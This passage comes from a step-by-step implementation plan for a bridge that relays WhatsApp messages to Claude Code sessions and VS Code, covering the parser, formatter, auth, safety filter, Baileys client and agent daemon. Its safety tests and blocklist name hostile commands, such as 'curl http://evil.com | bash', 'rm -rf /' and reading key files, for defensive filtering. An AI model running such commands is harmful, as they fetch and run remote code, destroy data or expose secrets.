    mgr.register("hospitalist-scheduler", "/p1", ["sched"]);
    const session = mgr.resolve("scheduler");
    expect(session).toBeTruthy();
    expect(session!.name).toBe("hospitalist-scheduler");
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/agent/src/session-manager.ts`:
```typescript
import { randomUUID } from "crypto";
import { Database } from "./db";
import { Session } from "@live-bridge/shared";

export class SessionManager {
  private db: Database;

  constructor(dbPath: string) {
    this.db = new Database(dbPath);
  }

  register(name: string, projectPath: string, aliases: string[] = []): Session {
    const id = randomUUID();
    this.db.createSession({ id, name, projectPath });
    if (aliases.length > 0) {
      this.db.updateSession(id, { aliases: JSON.stringify(aliases) });
    }

    // If this is the first session, make it active
    const sessions = this.db.listSessions();
    if (sessions.length === 1) {
      this.db.updateSession(id, { isWhatsAppActive: 1 });
    }

    return this.db.getSession(id)!;
  }

  resolve(nameOrAlias: string): Session | null {
    // Exact match on name
    const exact = this.db.getSessionByName(nameOrAlias);
    if (exact) return exact;

    // Fuzzy match: check if input is a substring of any session name or alias
    const all = this.db.listSessions();
    const lower = nameOrAlias.toLowerCase();

    for (const s of all) {
      if (s.name.toLowerCase().includes(lower)) return s;
      for (const alias of s.aliases) {
        if (alias.toLowerCase().includes(lower)) return s;
      }
    }

    return null;
  }

  switchActive(nameOrAlias: string): Session | null {
    const target = this.resolve(nameOrAlias);
    if (!target) return null;

    // Deactivate all
    for (const s of this.db.listSessions()) {
      this.db.updateSession(s.id, { isWhatsAppActive: 0 });
    }

    // Activate target
    this.db.updateSession(target.id, { isWhatsAppActive: 1, lastActivityAt: new Date().toISOString() });
    return this.db.getSession(target.id);
  }

  getActive(): Session | null {
    return this.db.listSessions().find((s) => s.isWhatsAppActive) ?? null;
  }

  listSessions(): Session[] {
    return this.db.listSessions();
  }

  getDatabase(): Database {
    return this.db;
  }

  close(): void {
    this.db.close();
  }
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(agent): session manager with registration, routing, fuzzy match"
```

---

## Phase 2: WhatsApp Bridge

**Deliverable:** Send a WhatsApp message, see Claude Code execute the task, receive classified responses on phone.

---

### Task 9: Bridge Package Scaffold

**Files:**
- Create: `packages/bridge/package.json`
- Create: `packages/bridge/tsconfig.json`

**Step 1: Create package.json**

`packages/bridge/package.json`:
```json
{
  "name": "@live-bridge/bridge",
  "version": "0.1.0",
  "main": "dist/index.js",
  "scripts": {
    "build": "tsc",
    "start": "node dist/index.js",
    "dev": "tsx watch src/index.ts",
    "test": "vitest run"
  },
  "dependencies": {
    "@live-bridge/shared": "*",
    "@whiskeysockets/baileys": "^6.0.0",
    "ws": "^8.18.0",
    "bcrypt": "^5.1.0",
    "js-yaml": "^4.1.0"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "tsx": "^4.0.0",
    "vitest": "^3.0.0",
    "@types/ws": "^8.5.0",
    "@types/bcrypt": "^5.0.0"
  }
}
```

**Step 2: Install and verify**

```bash
npm install
```

**Step 3: Commit**

```bash
git add -A && git commit -m "chore: scaffold bridge package with Baileys dependency"
```

---

### Task 10: WhatsApp Message Parser

**Files:**
- Create: `packages/bridge/src/parser.ts`
- Test: `packages/bridge/src/__tests__/parser.test.ts`

**Step 1: Write failing test**

`packages/bridge/src/__tests__/parser.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { parseInbound, ParsedMessage, MessageIntent } from "../parser";

describe("WhatsApp Message Parser", () => {
  it("parses plain text as command to active session", () => {
    const msg = parseInbound("fix the token bug");
    expect(msg.intent).toBe(MessageIntent.Command);
    expect(msg.text).toBe("fix the token bug");
    expect(msg.targetSession).toBeNull();
  });

  it("parses /sessionname prefix as targeted command", () => {
    const msg = parseInbound("/ccp fix the HCC pipeline");
    expect(msg.intent).toBe(MessageIntent.TargetedCommand);
    expect(msg.targetSession).toBe("ccp");
    expect(msg.text).toBe("fix the HCC pipeline");
  });

  it("parses /switch as session switch", () => {
    const msg = parseInbound("/switch scheduler");
    expect(msg.intent).toBe(MessageIntent.Switch);
    expect(msg.targetSession).toBe("scheduler");
  });

  it("parses /sessions as list request", () => {
    const msg = parseInbound("/sessions");
    expect(msg.intent).toBe(MessageIntent.ListSessions);
  });

  it("parses /all as broadcast", () => {
    const msg = parseInbound("/all run tests");
    expect(msg.intent).toBe(MessageIntent.Broadcast);
    expect(msg.text).toBe("run tests");
  });

  it("parses number reply as decision response", () => {
    const msg = parseInbound("1");
    expect(msg.intent).toBe(MessageIntent.DecisionReply);
    expect(msg.actionIndex).toBe(0);
  });

  it("parses /abort as special command", () => {
    const msg = parseInbound("/abort");
    expect(msg.intent).toBe(MessageIntent.Special);
    expect(msg.specialCommand).toBe("abort");
  });

  it("parses /ctx as context request", () => {
    const msg = parseInbound("/ctx full");
    expect(msg.intent).toBe(MessageIntent.Special);
    expect(msg.specialCommand).toBe("ctx");
    expect(msg.text).toBe("full");
  });

  it("parses /detach and /attach", () => {
    expect(parseInbound("/detach").intent).toBe(MessageIntent.Special);
    expect(parseInbound("/attach ccp").intent).toBe(MessageIntent.Special);
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/bridge/src/parser.ts`:
```typescript
export enum MessageIntent {
  Command = "command",
  TargetedCommand = "targeted_command",
  Switch = "switch",
  ListSessions = "list_sessions",
  Broadcast = "broadcast",
  DecisionReply = "decision_reply",
  Special = "special",
}

const SPECIAL_COMMANDS = new Set([
  "status", "abort", "kill", "help", "verbose", "ctx", "pause", "resume", "detach", "attach",
]);

export interface ParsedMessage {
  intent: MessageIntent;
  text: string;
  targetSession: string | null;
  actionIndex: number | null;
  specialCommand: string | null;
}

export function parseInbound(raw: string): ParsedMessage {
  const text = raw.trim();

  // Number reply (1, 2, 3) → decision response
  if (/^\d+$/.test(text) && parseInt(text) <= 10) {
    return { intent: MessageIntent.DecisionReply, text, targetSession: null, actionIndex: parseInt(text) - 1, specialCommand: null };
  }

  // "accept all", "reject" shorthand
  if (/^(accept|reject)\b/i.test(text)) {
    return { intent: MessageIntent.DecisionReply, text, targetSession: null, actionIndex: /^accept/i.test(text) ? 0 : -1, specialCommand: null };
  }

  // Slash commands
  if (text.startsWith("/")) {
    const parts = text.slice(1).split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const rest = parts.slice(1).join(" ");

    if (cmd === "sessions" || cmd === "session" && parts[1] === "list") {
      return { intent: MessageIntent.ListSessions, text: "", targetSession: null, actionIndex: null, specialCommand: null };
    }

    if (cmd === "switch") {
      return { intent: MessageIntent.Switch, text: "", targetSession: rest, actionIndex: null, specialCommand: null };
    }

    if (cmd === "all") {
      return { intent: MessageIntent.Broadcast, text: rest, targetSession: null, actionIndex: null, specialCommand: null };
    }

    if (SPECIAL_COMMANDS.has(cmd)) {
      return { intent: MessageIntent.Special, text: rest, targetSession: rest || null, specialCommand: cmd, actionIndex: null };
    }

    // Assume it's a /sessionname prefix
    return { intent: MessageIntent.TargetedCommand, text: rest, targetSession: cmd, actionIndex: null, specialCommand: null };
  }

  // Plain text → command to active session
  return { intent: MessageIntent.Command, text, targetSession: null, actionIndex: null, specialCommand: null };
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(bridge): WhatsApp inbound message parser with routing"
```

---

### Task 11: WhatsApp Message Formatter

**Files:**
- Create: `packages/bridge/src/formatter.ts`
- Test: `packages/bridge/src/__tests__/formatter.test.ts`

**Step 1: Write failing test**

`packages/bridge/src/__tests__/formatter.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { formatForWhatsApp, FormatInput } from "../formatter";
import { Classification } from "@live-bridge/shared";

describe("WhatsApp Formatter", () => {
  it("formats STATUS as batched digest with emoji", () => {
    const result = formatForWhatsApp({
      classification: Classification.Status,
      text: "Reading src/api/auth.ts...",
      sessionName: "chartcopilot",
      multiSession: true,
    });
    expect(result).toContain("[chartcopilot]");
    expect(result).toMatch(/📡/);
  });

  it("formats DECISION with warning and action hints", () => {
    const result = formatForWhatsApp({
      classification: Classification.Decision,
      text: "Apply all 3 fixes?\n2 files modified, ~45 lines changed",
      sessionName: "chartcopilot",
      multiSession: true,
      actions: ["Accept", "Reject", "Show diff"],
    });
    expect(result).toContain("⚠️");
    expect(result).toContain("1. Accept");
    expect(result).toContain("2. Reject");
  });

  it("formats ERROR with error emoji", () => {
    const result = formatForWhatsApp({
      classification: Classification.Error,
      text: "TypeError: x is not a function",
      sessionName: "ccp",
      multiSession: false,
    });
    expect(result).toContain("❌");
    expect(result).not.toContain("[ccp]"); // single session, no tag
  });

  it("truncates long messages to maxLength", () => {
    const longText = "x".repeat(2000);
    const result = formatForWhatsApp({
      classification: Classification.Output,
      text: longText,
      sessionName: "ccp",
      multiSession: false,
      maxLength: 1500,
    });
    expect(result.length).toBeLessThanOrEqual(1500);
  });

  it("omits session tag in single-session mode", () => {
    const result = formatForWhatsApp({
      classification: Classification.Output,
      text: "All tests passing",
      sessionName: "ccp",
      multiSession: false,
    });
    expect(result).not.toContain("[ccp]");
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

`packages/bridge/src/formatter.ts`:
```typescript
import { Classification } from "@live-bridge/shared";
import { DEFAULTS } from "@live-bridge/shared";

export interface FormatInput {
  classification: Classification;
  text: string;
  sessionName: string;
  multiSession: boolean;
  actions?: string[];
  maxLength?: number;
}

export function formatForWhatsApp(input: FormatInput): string {
  const maxLen = input.maxLength ?? DEFAULTS.MAX_WA_MESSAGE_LENGTH;
  const parts: string[] = [];

  // Session tag
  if (input.multiSession) {
    parts.push(`[${input.sessionName}]`);
  }

  // Classification prefix
  switch (input.classification) {
    case Classification.Status:
      parts.push(`📡 ${input.text}`);
      break;
    case Classification.Decision:
      parts.push(`⚠️ DECISION REQUIRED\n\n${input.text}`);
      if (input.actions?.length) {
        parts.push("");
        input.actions.forEach((a, i) => parts.push(`${i + 1}. ${a}`));
        parts.push("\nReply with number to choose.");
      }
      break;
    case Classification.Error:
      parts.push(`❌ ERROR\n\n${input.text}`);
      break;
    case Classification.Output:
    default:
      parts.push(input.text);
      break;
  }

  let result = parts.join(" ").trim();

  // Rejoin with newlines for decision formatting
  if (input.classification === Classification.Decision) {
    result = parts.join("\n").trim();
    if (input.multiSession) {
      result = `[${input.sessionName}]\n` + result.replace(`[${input.sessionName}]\n`, "");
    }
  }

  // Truncate
  if (result.length > maxLen) {
    result = result.slice(0, maxLen - 20) + "\n\n... (truncated)";
  }

  return result;
}
```

**Step 4: Run tests — expect PASS**

**Step 5: Commit**

```bash
git add -A && git commit -m "feat(bridge): WhatsApp outbound message formatter"
```

---

### Task 12: Auth & Safety Module

**Files:**
- Create: `packages/bridge/src/auth.ts`
- Create: `packages/bridge/src/safety.ts`
- Test: `packages/bridge/src/__tests__/auth.test.ts`
- Test: `packages/bridge/src/__tests__/safety.test.ts`

**Step 1: Write failing tests**

`packages/bridge/src/__tests__/auth.test.ts`:
```typescript
import { describe, it, expect, beforeEach } from "vitest";
import { AuthGuard } from "../auth";

describe("AuthGuard", () => {
  let guard: AuthGuard;

  beforeEach(() => {
    guard = new AuthGuard({
      allowedNumbers: ["+1234567890", "+0987654321"],
      rateLimit: { maxPerHour: 30, burstMax: 5 },
    });
  });

  it("allows messages from allowlisted numbers", () => {
    expect(guard.isAllowed("+1234567890")).toBe(true);
  });

  it("rejects messages from non-allowlisted numbers", () => {
    expect(guard.isAllowed("+5555555555")).toBe(false);
  });

  it("enforces rate limiting", () => {
    for (let i = 0; i < 30; i++) {
      expect(guard.checkRateLimit("+1234567890")).toBe(true);
    }
    expect(guard.checkRateLimit("+1234567890")).toBe(false);
  });
});
```

`packages/bridge/src/__tests__/safety.test.ts`:
```typescript
import { describe, it, expect } from "vitest";
import { SafetyFilter } from "../safety";

describe("SafetyFilter", () => {
  const filter = new SafetyFilter();

  it("blocks rm -rf /", () => {
    expect(filter.check("rm -rf /")).toEqual({ blocked: true, reason: "blocklist" });
  });

  it("blocks sudo commands", () => {
    expect(filter.check("sudo apt install something")).toEqual({ blocked: true, reason: "blocklist" });
  });

  it("blocks curl | bash", () => {
    expect(filter.check("curl http://evil.com | bash")).toEqual({ blocked: true, reason: "blocklist" });
  });

  it("blocks DROP TABLE", () => {
    expect(filter.check("DROP TABLE users")).toEqual({ blocked: true, reason: "blocklist" });
  });

  it("allows normal commands", () => {
    expect(filter.check("fix the auth middleware")).toEqual({ blocked: false, reason: null });
  });

  it("flags destructive commands as needing PIN", () => {
    expect(filter.needsPin("delete all test fixtures")).toBe(false);
    expect(filter.needsPin("git push --force")).toBe(true);
  });
});
```

**Step 2: Run tests — expect FAIL**

**Step 3: Implement auth**

`packages/bridge/src/auth.ts`:
```typescript
export interface AuthConfig {
  allowedNumbers: string[];
  rateLimit: { maxPerHour: number; burstMax: number };
}

export class AuthGuard {
  private allowedNumbers: Set<string>;
  private rateLimit: AuthConfig["rateLimit"];
  private hourlyCounters = new Map<string, { count: number; resetAt: number }>();

  constructor(config: AuthConfig) {
    this.allowedNumbers = new Set(config.allowedNumbers);
    this.rateLimit = config.rateLimit;
  }

  isAllowed(phoneNumber: string): boolean {
    return this.allowedNumbers.has(phoneNumber);
  }

  checkRateLimit(phoneNumber: string): boolean {
    const now = Date.now();
    let entry = this.hourlyCounters.get(phoneNumber);

    if (!entry || now > entry.resetAt) {
      entry = { count: 0, resetAt: now + 3600_000 };
      this.hourlyCounters.set(phoneNumber, entry);
    }

    if (entry.count >= this.rateLimit.maxPerHour) return false;
    entry.count++;
    return true;
  }
}
```

**Step 4: Implement safety**

`packages/bridge/src/safety.ts`:
```typescript
const BLOCKLIST_PATTERNS = [
  /\brm\s+-rf\s+\//i,
  /\bsudo\b/i,
  /\bDROP\s+(TABLE|DATABASE)\b/i,
  /\bcurl\b.*\|\s*bash/i,
  /\bwget\b.*\|\s*bash/i,
  /\bssh-keygen\b/i,
  /\bcat\s+.*\.(pem|key)\b/i,
  /\bchmod\s+777\b/i,
];

const PIN_REQUIRED_PATTERNS = [
  /\bgit\s+push\s+--force\b/i,
  /\bgit\s+reset\s+--hard\b/i,
  /\bnpm\s+publish\b/i,
  /\bdeploy\b/i,
  /\bmigrat(e|ion)\b/i,
];

export class SafetyFilter {
  check(command: string): { blocked: boolean; reason: string | null } {
    for (const pattern of BLOCKLIST_PATTERNS) {
      if (pattern.test(command)) {
        return { blocked: true, reason: "blocklist" };
      }
    }
    return { blocked: false, reason: null };
  }

  needsPin(command: string): boolean {
    return PIN_REQUIRED_PATTERNS.some((p) => p.test(command));
  }
}
```

**Step 5: Run tests — expect PASS**

**Step 6: Commit**

```bash
git add -A && git commit -m "feat(bridge): auth guard with allowlist/rate-limit and safety filter"
```

---

### Task 13: Baileys Integration

**Files:**
- Create: `packages/bridge/src/baileys.ts`
- Create: `packages/bridge/src/index.ts`

> **Note:** Baileys requires a real WhatsApp account to test. This task creates the integration code with manual testing via QR scan. Automated tests mock the Baileys socket.

**Step 1: Implement Baileys wrapper**

`packages/bridge/src/baileys.ts`:
```typescript
import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  WASocket,
  proto,
} from "@whiskeysockets/baileys";
import { Boom } from "@hapi/boom";
import { EventEmitter } from "events";
import path from "path";
import { AuthGuard } from "./auth";
import { SafetyFilter } from "./safety";
import { parseInbound, ParsedMessage } from "./parser";

export interface BaileysConfig {
  sessionPath: string;
  allowedNumbers: string[];
  rateLimit: { maxPerHour: number; burstMax: number };
}

export class WhatsAppClient extends EventEmitter {
  private sock: WASocket | null = null;
  private auth: AuthGuard;
  private safety: SafetyFilter;
  private config: BaileysConfig;

  constructor(config: BaileysConfig) {
    super();
    this.config = config;
    this.auth = new AuthGuard({
      allowedNumbers: config.allowedNumbers,
      rateLimit: config.rateLimit,
    });
    this.safety = new SafetyFilter();
  }

  async connect(): Promise<void> {
    const { state, saveCreds } = await useMultiFileAuthState(this.config.sessionPath);

    this.sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
    });

    this.sock.ev.on("creds.update", saveCreds);

    this.sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const reason = (lastDisconnect?.error as Boom)?.output?.statusCode;
        if (reason !== DisconnectReason.loggedOut) {
          // Auto-reconnect
          setTimeout(() => this.connect(), 3000);
        }
        this.emit("disconnected", reason);
      } else if (connection === "open") {
        this.emit("connected");
      }
    });

    this.sock.ev.on("messages.upsert", ({ messages }) => {
      for (const msg of messages) {
        if (!msg.message || msg.key.fromMe) continue;

        const sender = msg.key.remoteJid?.replace(/@s\.whatsapp\.net$/, "") ?? "";
        const phoneNumber = "+" + sender;

        // Auth check
        if (!this.auth.isAllowed(phoneNumber)) {
          this.emit("auth_failure", phoneNumber);
          continue;
        }

        if (!this.auth.checkRateLimit(phoneNumber)) {
          this.emit("rate_limited", phoneNumber);
          continue;
        }

        const text =
          msg.message.conversation ??
          msg.message.extendedTextMessage?.text ??
          "";

        if (!text) continue;

        // Safety check
        const safetyResult = this.safety.check(text);
        if (safetyResult.blocked) {
          this.emit("blocked", { phoneNumber, text, reason: safetyResult.reason });
          this.sendMessage(sender + "@s.whatsapp.net", `❌ Command blocked: ${safetyResult.reason}`);
          continue;
        }

        const parsed = parseInbound(text);
        this.emit("message", { sender: phoneNumber, parsed, raw: text, msgKey: msg.key });
      }
    });
  }

  async sendMessage(jid: string, text: string): Promise<void> {
    if (!this.sock) return;
    await this.sock.sendMessage(jid, { text });
  }

  async sendToNumber(phoneNumber: string, text: string): Promise<void> {
    const jid = phoneNumber.replace("+", "") + "@s.whatsapp.net";
    await this.sendMessage(jid, text);
  }
}
```

**Step 2: Commit**

```bash
git add -A && git commit -m "feat(bridge): Baileys WhatsApp client with auth and safety integration"
```

---

### Task 14: Agent WebSocket Server + Message Router

**Files:**
- Create: `packages/agent/src/ws-server.ts`
- Create: `packages/agent/src/message-router.ts`
- Create: `packages/agent/src/index.ts`

**Step 1: Implement WebSocket server**

`packages/agent/src/ws-server.ts`:
```typescript
import { WebSocketServer, WebSocket } from "ws";
import { EventEmitter } from "events";
import { Envelope, createEnvelope, MessageType, Source } from "@live-bridge/shared";

interface ClientInfo {
  ws: WebSocket;
  type: "bridge" | "vscode";
  sessionId?: string;
}

export class AgentWSServer extends EventEmitter {
  private bridgeWss: WebSocketServer;
  private vscodeWss: WebSocketServer;
  private clients = new Map<WebSocket, ClientInfo>();

  constructor(bridgePort: number, vscodePort: number) {
    super();

    this.bridgeWss = new WebSocketServer({ port: bridgePort });
    this.vscodeWss = new WebSocketServer({ port: vscodePort });

    this.bridgeWss.on("connection", (ws) => {
      this.clients.set(ws, { ws, type: "bridge" });
      ws.on("message", (data) => this.handleMessage(ws, data.toString()));
      ws.on("close", () => this.clients.delete(ws));
      this.emit("bridge_connected");
    });

    this.vscodeWss.on("connection", (ws) => {
      this.clients.set(ws, { ws, type: "vscode" });
      ws.on("message", (data) => this.handleMessage(ws, data.toString()));
      ws.on("close", () => {
        const info = this.clients.get(ws);
        if (info?.sessionId) this.emit("vscode_disconnected", info.sessionId);
        this.clients.delete(ws);
      });
      this.emit("vscode_connected");
    });
  }

  private handleMessage(ws: WebSocket, raw: string): void {
    try {
      const envelope: Envelope = JSON.parse(raw);
      const info = this.clients.get(ws);
      if (info && envelope.type === MessageType.Control && (envelope.payload as any).action === "register") {
        info.sessionId = envelope.sessionId;
      }
      this.emit("envelope", envelope, info);
    } catch {
      // Ignore malformed messages
    }
  }

  sendToBridge(envelope: Envelope): void {
    const json = JSON.stringify(envelope);
    for (const [, info] of this.clients) {
      if (info.type === "bridge" && info.ws.readyState === WebSocket.OPEN) {
        info.ws.send(json);
      }
    }
  }

  sendToVSCode(sessionId: string, envelope: Envelope): void {
    const json = JSON.stringify(envelope);
    for (const [, info] of this.clients) {
      if (info.type === "vscode" && info.sessionId === sessionId && info.ws.readyState === WebSocket.OPEN) {
        info.ws.send(json);
      }
    }
  }

  broadcastToVSCode(envelope: Envelope): void {
    const json = JSON.stringify(envelope);
    for (const [, info] of this.clients) {
      if (info.type === "vscode" && info.ws.readyState === WebSocket.OPEN) {
        info.ws.send(json);
      }
    }
  }

  close(): void {
    this.bridgeWss.close();
    this.vscodeWss.close();
  }
}
```

**Step 2: Implement message router**

`packages/agent/src/message-router.ts`:
```typescript
import { Classification, MessageType, Source, createEnvelope } from "@live-bridge/shared";
import { AgentWSServer } from "./ws-server";
import { ClassifiedLine } from "./pty-wrapper";

export class MessageRouter {
  private statusBuffer = new Map<string, string[]>();
  private statusTimers = new Map<string, ReturnType<typeof setInterval>>();
  private batchIntervalMs: number;

  constructor(
    private wsServer: AgentWSServer,
    opts: { statusBatchIntervalMs?: number } = {}
  ) {
    this.batchIntervalMs = opts.statusBatchIntervalMs ?? 10_000;
  }

  route(sessionId: string, sessionName: string, line: ClassifiedLine): void {
    // Always send full fidelity to VS Code
    this.wsServer.sendToVSCode(sessionId, createEnvelope({
      type: MessageType.Stream,
      source: Source.ClaudeCode,
      sessionId,
      payload: { text: line.text, raw: line.raw, classification: line.classification },
    }));

    // Route to bridge based on classification
    switch (line.classification) {
      case Classification.Status:
        this.bufferStatus(sessionId, sessionName, line.text);
        break;
      case Classification.Decision:
        this.wsServer.sendToBridge(createEnvelope({
          type: MessageType.Decision,
          source: Source.ClaudeCode,
          sessionId,
          payload: { text: line.text, sessionName },
        }));
        break;
      case Classification.Error:
        this.wsServer.sendToBridge(createEnvelope({
          type: MessageType.Error,
          source: Source.ClaudeCode,
          sessionId,
          payload: { text: line.text, sessionName },
        }));
        break;
      case Classification.Output:
      default:
        this.wsServer.sendToBridge(createEnvelope({
          type: MessageType.Response,
          source: Source.ClaudeCode,
          sessionId,
          payload: { text: line.text, sessionName },
        }));
        break;
    }
  }

  private bufferStatus(sessionId: string, sessionName: string, text: string): void {
    if (!this.statusBuffer.has(sessionId)) {
      this.statusBuffer.set(sessionId, []);
      const timer = setInterval(() => this.flushStatus(sessionId, sessionName), this.batchIntervalMs);
      this.statusTimers.set(sessionId, timer);
    }
    this.statusBuffer.get(sessionId)!.push(text);
  }

  private flushStatus(sessionId: string, sessionName: string): void {
    const lines = this.statusBuffer.get(sessionId);
    if (!lines || lines.length === 0) return;

    const digest = lines.join("\n");
    this.statusBuffer.set(sessionId, []);

    this.wsServer.sendToBridge(createEnvelope({
      type: MessageType.Status,
      source: Source.ClaudeCode,
      sessionId,
      payload: { text: digest, sessionName },
    }));
  }

  destroy(): void {
    for (const timer of this.statusTimers.values()) clearInterval(timer);
  }
}
```

**Step 3: Commit**

```bash
git add -A && git commit -m "feat(agent): WebSocket server and classified message router"
```

---

### Task 15: Agent Entry Point (Wire It All Together)

**Files:**
- Create: `packages/agent/src/index.ts`
- Create: `config.example.yaml`

**Step 1: Implement agent daemon entry**

`packages/agent/src/index.ts`:
```typescript
import { readFileSync } from "fs";
import { resolve } from "path";
import { load } from "js-yaml";
import { SessionManager } from "./session-manager";
import { PtyWrapper } from "./pty-wrapper";
import { MessageRouter } from "./message-router";
import { AgentWSServer } from "./ws-server";
import { collectGitContext, formatContextHeader } from "./git-context";
import { MessageType, Source, createEnvelope, DEFAULTS } from "@live-bridge/shared";

interface Config {
  server: { port: number; host: string; vscodePort: number };
  classifier: { statusBatchInterval: number };
  gitContext: { mode: "auto" | "on-demand" };
}

function loadConfig(path: string): Config {
  try {
    const raw = readFileSync(path, "utf-8");
    return load(raw) as Config;
  } catch {
    return {
      server: { port: DEFAULTS.WS_PORT_BRIDGE, host: "127.0.0.1", vscodePort: DEFAULTS.WS_PORT_VSCODE },
      classifier: { statusBatchInterval: DEFAULTS.STATUS_BATCH_INTERVAL_S },
      gitContext: { mode: "auto" },
    };
  }
}

async function main() {
  const configPath = resolve(process.env.HOME ?? process.env.USERPROFILE ?? "", ".claude-bridge", "config.yaml");
  const config = loadConfig(configPath);
  const dbPath = resolve(process.env.HOME ?? process.env.USERPROFILE ?? "", ".claude-bridge", "bridge.db");

  const sessionManager = new SessionManager(dbPath);
  const wsServer = new AgentWSServer(config.server.port, config.server.vscodePort);
  const router = new MessageRouter(wsServer, {
    statusBatchIntervalMs: config.classifier.statusBatchInterval * 1000,
  });

  const ptySessions = new Map<string, PtyWrapper>();

  console.log(`[agent] Bridge WS on :${config.server.port}, VS Code WS on :${config.server.vscodePort}`);

  // Handle inbound commands from bridge (WhatsApp)
  wsServer.on("envelope", async (envelope, clientInfo) => {
    if (envelope.type === MessageType.Command) {
      const sessionId = envelope.sessionId;
      const session = sessionManager.resolve(sessionId) ?? sessionManager.getActive();
      if (!session) return;

      const ptySession = ptySessions.get(session.id);
      if (!ptySession) return;

      let text = (envelope.payload as any).text as string;

      // Git context injection (auto mode)
      if (config.gitContext.mode === "auto" && clientInfo?.type === "bridge") {
        const ctx = await collectGitContext(session.projectPath);
        ctx.sessionId = session.id;
        text = `${formatContextHeader(ctx)}\n${text}`;
      }

      ptySession.write(text + "\n");
    }
  });

  // Handle VS Code session registration
  wsServer.on("envelope", (envelope) => {
    if (envelope.type === MessageType.Control) {
      const payload = envelope.payload as any;
      if (payload.action === "register") {
        const existing = sessionManager.resolve(payload.name);
        if (!existing) {
          sessionManager.register(payload.name, payload.projectPath, payload.aliases ?? []);
        }
      }
    }
  });

  console.log("[agent] Ready. Waiting for connections...");
}

main().catch((err) => {
  console.error("[agent] Fatal:", err);
  process.exit(1);
});
```

**Step 2: Create example config**

`config.example.yaml`:
```yaml
server:
  port: 9377
  host: 127.0.0.1
  vscodePort: 9378

whatsapp:
  allowedNumbers:
    - "+1234567890"
  sessionPath: ~/.claude-bridge/wa-session
  pin: "1234"
  rateLimit:
    maxPerHour: 30
    burstMax: 5

classifier:
  statusBatchInterval: 10
  waitTimeout: 500
  maxMessageLength: 1500

gitContext:
  mode: auto
  includeUncommittedDiff: true
  recentCommitCount: 3
  includeOpenFiles: true
  maxDiffFiles: 10
  ignorePatterns:
    - ".env"
    - "*.key"
    - "*secret*"
    - "credentials/*"

safety:
  blocklist:
    - "rm -rf /"
    - "sudo"
    - "DROP TABLE"
    - "DROP DATABASE"
  auditLog:
    path: ~/.claude-bridge/audit.db
    retentionDays: 30

sessions:
  aliases:
    chartcopilot: ["ccp", "chart"]
    hospitalist-scheduler: ["sched"]
  fuzzyMatch: true
  decisionTimeout: 0
  crossSessionNotify: true
```

**Step 3: Commit**

```bash
git add -A && git commit -m "feat(agent): daemon entry point wiring PTY, sessions, router, and git context"
```

---

## Phase 3: VS Code Extension

**Deliverable:** Full bidirectional bridge operational across WhatsApp and VS Code with live streaming.

---

### Task 16: Extension Scaffold

**Files:**
- Create: `packages/extension/package.json`
- Create: `packages/extension/tsconfig.json`
- Create: `packages/extension/src/extension.ts`

**Step 1: Create package.json** (VS Code extension manifest)

`packages/extension/package.json`:
```json
{
  "name": "claude-code-live-bridge",
  "displayName": "Claude Code Live Bridge",
  "description": "WhatsApp ↔ Claude Code ↔ VS Code bidirectional bridge",
  "version": "0.1.0",
  "engines": { "vscode": "^1.85.0" },
  "categories": ["Other"],
  "activationEvents": [],
  "main": "./dist/extension.js",
  "contributes": {
    "viewsContainers": {
      "activitybar": [
        { "id": "claude-bridge", "title": "Claude Bridge", "icon": "$(radio-tower)" }
      ]
    },
    "views": {
      "claude-bridge": [
        { "type": "webview", "id": "claudeBridge.sidebar", "name": "Live Session" }
      ]
    },
    "commands": [
      { "command": "claudeBridge.connect", "title": "Claude Bridge: Connect" },
      { "command": "claudeBridge.disconnect", "title": "Claude Bridge: Disconnect" },
      { "command": "claudeBridge.refreshContext", "title": "Claude Bridge: Refresh Context" },
      { "command": "claudeBridge.setSessionName", "title": "Claude Bridge: Set Session Name" },
      { "command": "claudeBridge.routeHere", "title": "Claude Bridge: Route WhatsApp Here" },
      { "command": "claudeBridge.acceptAll", "title": "Claude Bridge: Accept All" },
      { "command": "claudeBridge.rejectAll", "title": "Claude Bridge: Reject All" }
    ]
  },
  "scripts": {
    "build": "tsc",
    "watch": "tsc -w",
    "package": "vsce package"
  },
  "dependencies": {
    "@live-bridge/shared": "*",
    "ws": "^8.18.0"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "@types/vscode": "^1.85.0",
    "@types/ws": "^8.5.0"
  }
}
```

**Step 2: Implement extension activation**

`packages/extension/src/extension.ts`:
```typescript
import * as vscode from "vscode";
import { SidebarProvider } from "./sidebar";
import { BridgeWSClient } from "./ws-client";
import { GitWatcher } from "./git-watcher";

let wsClient: BridgeWSClient | undefined;
let gitWatcher: GitWatcher | undefined;

export function activate(context: vscode.ExtensionContext) {
  wsClient = new BridgeWSClient();
  gitWatcher = new GitWatcher(wsClient);

  const sidebarProvider = new SidebarProvider(context.extensionUri, wsClient);

  context.subscriptions.push(
    vscode.window.registerWebviewViewProvider("claudeBridge.sidebar", sidebarProvider),

    vscode.commands.registerCommand("claudeBridge.connect", () => {
      wsClient!.connect();
    }),

    vscode.commands.registerCommand("claudeBridge.disconnect", () => {
      wsClient!.disconnect();
    }),

    vscode.commands.registerCommand("claudeBridge.refreshContext", () => {
      gitWatcher!.forceRefresh();
    }),

    vscode.commands.registerCommand("claudeBridge.setSessionName", async () => {
      const name = await vscode.window.showInputBox({ prompt: "Session name for this workspace" });
      if (name) wsClient!.setSessionName(name);
    }),

    vscode.commands.registerCommand("claudeBridge.routeHere", () => {
      wsClient!.requestRouteHere();
    }),
  );

  // Status bar
  const statusBar = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 50);
  statusBar.text = "$(radio-tower) Bridge: Disconnected";
  statusBar.command = "claudeBridge.connect";
  statusBar.show();
  context.subscriptions.push(statusBar);

  wsClient.on("connected", () => {
    statusBar.text = "$(radio-tower) Bridge: Connected";
    statusBar.color = undefined;
